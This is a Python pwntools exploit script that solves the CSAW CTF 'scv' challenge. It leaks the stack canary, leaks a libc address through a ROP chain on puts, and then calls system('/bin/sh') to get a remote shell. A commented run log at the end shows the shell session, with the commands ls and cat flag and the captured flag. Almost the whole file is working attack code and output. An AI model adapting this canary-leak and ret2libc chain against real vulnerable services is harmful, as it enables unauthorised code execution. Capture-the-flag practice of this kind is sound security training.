#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=True, terminal=['tmux', 'neww'])

if args['GDB']:
    elf, libc = ELF('./scv-amd64-2.23-0ubuntu9'), ELF('libs/amd64/2.23/0ubuntu9/libc-2.23.so')
    io = gdb.debug(
        './scv-amd64-2.23-0ubuntu9', gdbscript='''\
        c
    ''')
elif args['REMOTE']:
    elf, libc = ELF('./scv'), ELF('libs/amd64/2.23/0ubuntu9/libc-2.23.so')
    io = remote('pwn.chal.csaw.io', 3764)
else:
    elf, libc = ELF('./scv-amd64-2.23-0ubuntu9'), ELF('libs/amd64/2.23/0ubuntu9/libc-2.23.so')
    io = process(elf.path)


def find_canary():
    io.recvuntil('>>')
    io.sendline('1')
    io.recvuntil('>>')
    payload = fit(length=0xa8 + 1)
    io.send(payload)

    io.recvuntil('>>')
    io.sendline('2')
    io.recvuntil('WELL.....\n-------------------------\n')
    io.recvn(0xa8 + 1)
    canary = u64('\x00' + io.recvn(7))
    return canary


def find_libc_address():
    rop = ROP(elf)
    rop.raw(rop.find_gadget(['pop rdi', 'ret']))
    rop.raw(elf.symbols['got.puts'])
    rop.raw(elf.symbols['plt.puts'])
    rop.raw(p64(0x400A96))  # go back to main()
    print rop.dump()

    io.recvuntil('>>')
    io.sendline('1')
    io.recvuntil('>>')
    payload = fit({0xa8: canary, 0xb8: bytes(rop)})
    io.send(payload)

    io.recvuntil('>>')
    io.sendline('3')

    io.recvuntil('BYE ~ TIME TO MINE MIENRALS...\n')
    puts_got = u64(io.recvn(6) + '\x00\x00')
    libc_address = puts_got - libc.symbols['puts']
    return libc_address


canary = find_canary()
success('canary: %s' % hex(canary))

libc.address = find_libc_address()
success('libc address: %s' % hex(libc.address))

rop = ROP(libc)
rop.system(next(libc.search('/bin/sh')))
print rop.dump()

io.recvuntil('>>')
io.sendline('1')
io.recvuntil('>>')
payload = fit({0xa8: canary, 0xb8: bytes(rop)})
io.send(payload)

io.recvuntil('>>')
io.sendline('3')

io.interactive()

# $ ./scv.py REMOTE
# [+] Opening connection to pwn.chal.csaw.io on port 3764: Done
# [*] '/home/ubuntu/vbox/scv'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
# [*] '/home/ubuntu/vbox/libc-amd64-2.23-0ubuntu9.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] canary: 0xa9a2aaa61ce5f100
# [*] Loaded cached gadgets for './scv'
# 0x0000:         0x400ea3 pop rdi; ret
# 0x0008:         0x602018 got.puts
# 0x0010:         0x4008cc puts
# 0x0018: '\x96\n@\x00\x00\x00\x00\x00' '\x96\n@\x00\x00\x00\x00\x00'
# [*] libc address: 0x7f21b28f0000
# [*] Loaded cached gadgets for './libc-amd64-2.23-0ubuntu9.so'
# 0x0000:   0x7f21b2911102 pop rdi; ret
# 0x0008:   0x7f21b2a7cd17
# 0x0010:   0x7f21b2935390 system
# 0x0018:       'gaaahaaa' <pad>
# [*] Switching to interactive mode
# [*]BYE ~ TIME TO MINE MIENRALS...
# $ ls
# flag
# scv
# $ cat flag
# flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
